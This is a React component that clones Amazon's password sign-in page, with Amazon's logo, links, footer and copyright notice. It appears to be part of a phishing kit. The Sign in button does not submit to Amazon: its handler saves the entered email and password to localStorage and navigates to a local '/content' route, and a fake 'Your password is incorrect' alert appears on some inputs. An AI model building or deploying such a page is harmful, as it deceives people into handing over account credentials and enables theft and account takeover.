import React, { useState } from 'react';

export default function PassLaptop({
    email,
    password,
    setPassword,
    showErrorPass,
    setShowErrorPass,
    emptyPass,
    setEmptyPass,
    setNavigate,
}) {
    const handleInputChange = (event) => {
        setPassword(event.target.value);
    };

    const handleContinueClick = (event) => {
        if (password.includes(' ')) {
            event.preventDefault();
            setShowErrorPass(true);
            setEmptyPass(false);
        } else if (password.trim() === '') {
            event.preventDefault();
            setEmptyPass(true);
            setShowErrorPass(false);
        } else {
            setShowErrorPass(false);
            setEmptyPass(false);
            localStorage.setItem('email', email);
            localStorage.setItem('password', password);
            setNavigate(true);
        }
    };

    return (
        <div id="a-page">
            <div className="a-section a-padding-medium auth-workflow">
                <div className="a-section a-spacing-none auth-navbar">
                    <div className="a-section a-spacing-medium a-text-center">
                        <a
                            className="a-link-nav-icon"
                            tabIndex="-1"
                            href="/ref=ap_frn_logo"
                        >
                            <i
                                className="a-icon a-icon-logo"
                                role="img"
                                aria-label="Amazon"
                            ></i>
                        </a>
                    </div>
                </div>

                <div id="authportal-center-section" className="a-section">
                    <div id="authportal-main-section" className="a-section">
                        <div className="a-section a-spacing-base auth-pagelet-container">
                            <div className="a-section">
                                {showErrorPass && (
                                    <div
                                        id="auth-error-message-box"
                                        className="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base"
                                        role="alert"
                                    >
                                        <div className="a-box-inner a-alert-container">
                                            <h4 className="a-alert-heading">
                                                There was a problem
                                            </h4>
                                            <i className="a-icon a-icon-alert"></i>
                                            <div className="a-alert-content">
                                                <ul className="a-unordered-list a-nostyle a-vertical a-spacing-none">
                                                    <li>
                                                        <span className="a-list-item">
                                                            Your password is
                                                            incorrect
                                                        </span>
                                                    </li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                )}
                            </div>
                        </div>

                        <div className="a-section auth-pagelet-container">
                            <div className="a-section a-spacing-base">
                                <div
                                    id="passkey-error-alert"
                                    className="a-box a-alert a-alert-error aok-hidden"
                                    role="alert"
                                >
                                    <div className="a-box-inner a-alert-container">
                                        <h4 className="a-alert-heading">
                                            Passkey error
                                        </h4>
                                        <i className="a-icon a-icon-alert"></i>
                                        <div className="a-alert-content">
                                            <p id="passkey-client-error-message">
                                                Something went wrong, please
                                                sign-in another way or follow
                                                any instructions provided by
                                                your device.
                                            </p>
                                            <p
                                                id="passkey-generic-server-error-message"
                                                className="aok-hidden"
                                            >
                                                Sorry, your passkey isn't
                                                working. There might be a
                                                problem with the server. Sign in
                                                with your password or try your
                                                passkey again later.
                                            </p>
                                            <p
                                                id="passkey-server-error-message"
                                                className="aok-hidden"
                                            ></p>
                                        </div>
                                    </div>
                                </div>

                                <div className="a-box">
                                    <div className="a-box-inner a-padding-extra-large">
                                        <h1 className="a-spacing-small">
                                            Sign in
                                        </h1>

                                        <div className="a-row a-spacing-base">
                                            <span dir="ltr">{email} </span>
                                            <a
                                                id="ap_change_login_claim"
                                                className="a-link-normal"
                                                tabIndex="5"
                                                href="/ap/signin"
                                            >
                                                Change
                                            </a>
                                        </div>

                                        <form
                                            name="signIn"
                                            method="post"
                                            noValidate=""
                                            action="https://www.amazon.com/ap/signin"
                                            className="auth-validate-form auth-real-time-validation a-spacing-none"
                                            data-fwcim-id="KnTKa1Br"
                                        >
                                            <div className="a-section">
                                                <input
                                                    type="hidden"
                                                    name="email"
                                                    value="abc@gmail.com"
                                                    id="ap_email"
                                                />
                                                <input
                                                    type="text"
                                                    value="abc@gmail.com"
                                                    id="ap-credential-autofill-hint"
                                                    autoComplete="email"
                                                    name="email"
                                                    className="a-input-text hide"
                                                    data-claim="abc@gmail.com"
                                                />

                                                <div className="a-section a-spacing-large">
                                                    <div className="a-row">
                                                        <div className="a-column a-span5">
                                                            <label
                                                                htmlFor="ap_password"
                                                                className="a-form-label"
                                                            >
                                                                Password
                                                            </label>
                                                        </div>

                                                        <div className="a-column a-span7 a-text-right a-span-last">
                                                            <a
                                                                id="auth-fpp-link-bottom"
                                                                className="a-link-normal"
                                                                tabIndex="6"
                                                                href="https://www.amazon.com/ap/forgotpassword?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;signInRedirectToFPPThreshold=5&amp;pageId=usflex&amp;openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_custrec_signin&amp;prevRID=7ENZ1K9K36J7FTRETKQ7&amp;openid.assoc_handle=usflex&amp;openid.mode=checkid_setup&amp;prepopulatedLoginId=eyJjaXBoZXIiOiJuVmNoL1dsWk5LSDBQUGhLeGQ3RWtnPT0iLCJJViI6Im15OUZwa0QxOUx3UC9ZRnlwVm1TTmc9PSIsInZlcnNpb24iOjF9&amp;failedSignInCount=1&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&amp;timestamp=1709583220000"
                                                            >
                                                                Forgot your
                                                                password?
                                                            </a>
                                                        </div>
                                                    </div>

                                                    <input
                                                        type="password"
                                                        maxLength="1024"
                                                        id="ap_password"
                                                        value={password}
                                                        onChange={
                                                            handleInputChange
                                                        }
                                                        autoComplete="current-password"
                                                        name="password"
                                                        tabIndex="2"
                                                        className="a-input-text a-span12 auth-autofocus auth-required-field"
                                                    />

                                                    {emptyPass && (
                                                        <div
                                                            id="auth-password-missing-alert"
                                                            className="a-box a-alert-inline a-alert-inline-error a-spacing-top-mini"
                                                            role="alert"
                                                        >
                                                            <div className="a-box-inner a-alert-container">
                                                                <i className="a-icon a-icon-alert"></i>
                                                                <div className="a-alert-content">
                                                                    Enter your
                                                                    password
                                                                </div>
                                                            </div>
                                                        </div>
                                                    )}
                                                </div>

                                                <input
                                                    type="hidden"
                                                    name="encryptedPasswordExpected"
                                                />

                                                <div className="a-section">
                                                    <a
                                                        href="/content"
                                                        id=""
                                                        className="a-button a-button-span12 a-button-primary auth-disable-button-on-submit"
                                                        onClick={
                                                            handleContinueClick
                                                        }
                                                    >
                                                        <span className="a-button-inner">
                                                            <span
                                                                id="auth-signin-button-announce"
                                                                className="a-button-text"
                                                                aria-hidden="true"
                                                            >
                                                                Sign in
                                                            </span>
                                                        </span>
                                                    </a>

                                                    <div className="a-row a-spacing-top-medium mb-22">
                                                        <div className="a-section a-text-left">
                                                            <label
                                                                htmlFor="auth-remember-me"
                                                                className="a-form-label"
                                                            >
                                                                <div
                                                                    data-a-input-name="rememberMe"
                                                                    className="a-checkbox"
                                                                >
                                                                    <label>
                                                                        <input
                                                                            type="checkbox"
                                                                            name="rememberMe"
                                                                            value="true"
                                                                            tabIndex="4"
                                                                        />
                                                                        <i className="a-icon a-icon-checkbox"></i>
                                                                        <span className="a-label a-checkbox-label">
                                                                            Keep
                                                                            me
                                                                            signed
                                                                            in.
                                                                            <span
                                                                                className="a-declarative"
                                                                                data-action="a-popover"
                                                                                data-csa-c-type="widget"
                                                                                data-csa-c-func-deps="aui-da-a-popover"
                                                                                data-a-popover='{"closeButtonLabel":"","activate":"onclick","header":"\"Keep Me Signed In\" Checkbox","inlineContent":"\u003cp>Choosing \"Keep me signed in\" reduces the number of times you&apos;re asked to Sign-In on this device.\u003c\/p>\n\u003cp>To keep your account secure, use this option only on your personal devices.\u003c\/p>"}'
                                                                                data-csa-c-id="jbfmee-9uybjq-djqfdg-l40ywu"
                                                                            >
                                                                                <a
                                                                                    id="remember_me_learn_more_link"
                                                                                    href="/"
                                                                                    role="button"
                                                                                    className="a-popover-trigger a-declarative"
                                                                                >
                                                                                    {' '}
                                                                                    Details{' '}
                                                                                    <i className="a-icon a-icon-popover"></i>
                                                                                </a>
                                                                            </span>{' '}
                                                                        </span>
                                                                    </label>
                                                                </div>
                                                            </label>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </form>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div id="right-2"></div>

                <div className="a-section a-spacing-top-extra-large auth-footer">
                    <div className="a-divider a-divider-section">
                        <div className="a-divider-inner"></div>
                    </div>

                    <div className="a-section a-spacing-small a-text-center a-size-mini">
                        <span className="auth-footer-seperator"></span>

                        <a
                            className="a-link-normal"
                            target="_blank"
                            rel="noopener"
                            href="/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&amp;nodeId=508088"
                        >
                            Conditions of Use
                        </a>
                        <span className="auth-footer-seperator"></span>

                        <a
                            className="a-link-normal"
                            target="_blank"
                            rel="noopener"
                            href="/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&amp;nodeId=468496"
                        >
                            Privacy Notice
                        </a>
                        <span className="auth-footer-seperator"></span>

                        <a
                            className="a-link-normal"
                            target="_blank"
                            rel="noopener"
                            href="/help"
                        >
                            Help
                        </a>
                        <span className="auth-footer-seperator"></span>
                    </div>

                    <div className="a-section a-spacing-none a-text-center">
                        <span className="a-size-mini a-color-secondary">
                            © 1996-2024, Amazon.com, Inc. or its affiliates
                        </span>
                    </div>
                </div>
            </div>
        </div>
    );
}
